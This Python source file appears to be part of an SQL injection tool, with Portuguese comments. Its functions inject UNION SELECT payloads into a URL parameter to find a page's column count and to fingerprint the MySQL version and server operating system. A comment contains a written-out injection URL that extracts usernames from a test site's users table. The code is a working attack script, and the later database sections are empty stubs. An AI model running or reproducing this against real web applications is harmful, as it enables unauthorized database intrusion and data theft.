# !/usr/bin/env python3

'''
faz um fingerprint no servido, retornando o nome do banco de dados e as suas tabelas
'''

import requests
import re

from sqlalchemy import column


from core.config import FIND_NUMBER_OF_COLLUM_IN_TABLE
from core.config import INITIAL_COUNT_VALUE
from core.config import VULNERABLE_COLLUM_DETECTING
from core.config import CHECKING_FOR_DBMS_VERSION
from core.config import GET_TABLES_NAMES
from core.config import MYSQL_SERVER_VERSIONS
from core.config import OS
from core import colors as color
from core.utils import  urlExplode


## http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+1,2,3,4,5,6,(SELECT+uname+FROM+acuart.users+WHERE%202=2),8,9,10,11

'''
mysql db fingerprint
'''
def _dbFingerprint(target):
    current_table_cullum_number = 0;
    
    url_exploded = urlExplode(target)
    para = re.compile('(=)\w+')
    if para.search(target):
        splited_para = para.search(target).group()
        for current_table_cullum_number_counter in range(1, 100):
            exploited_target_url = target.replace(splited_para, splited_para+FIND_NUMBER_OF_COLLUM_IN_TABLE+str(current_table_cullum_number_counter))
            main_request = requests.get(url=exploited_target_url)
            if 'mysql' in main_request.text.lower():
                current_table_cullum_number = current_table_cullum_number_counter - 1
                break
    return  current_table_cullum_number

## get sb server version....
def _serverVersion(target, cullumns_number):
    url_exploded = urlExplode(target)
    para = re.compile('(=)\w+')
    version = re.compile('^(\d+\.)?(\d+\.)?(\*|\d+)$')
    exploited_target_url = str()
    collumns_number_list = []
    columns = str()
    index_server_fingerprint_info = 1
    server_version = str()
    server_system = str()
    
    server_fingerprint_info = {}
    if para.search(target):
        splited_para = para.search(target).group()
        for collumns_perc in range(1, cullumns_number+1): ## apenas preenche umma lista contendo as colunas
            collumns_number_list.append(collumns_perc)
        ## transforma a lista em string eliminando os parentes reto
        columns = str(collumns_number_list)
        columns = columns.replace("[", "")
        columns = columns.replace("]", "")
        
        for collumns_perc in  range(1, cullumns_number+1):
            exploited_target_url = target.replace(splited_para, splited_para+VULNERABLE_COLLUM_DETECTING+columns.replace(str(collumns_perc), CHECKING_FOR_DBMS_VERSION))
            main_request = requests.get(url=exploited_target_url)
            for mysql_server_version in MYSQL_SERVER_VERSIONS:
                if mysql_server_version in main_request.text.lower():
                    server_version = mysql_server_version
                    server_fingerprint_info[1] = server_version
                    break
            for dbms_backend_system in OS:
                if dbms_backend_system in main_request.text.lower():
                    server_system = dbms_backend_system
                    server_fingerprint_info[2] = server_system
                    break
    return server_fingerprint_info

'''
mssql db fingerprint
'''

'''
postgres db fingerprint
'''

'''
oracle db fingerprint
'''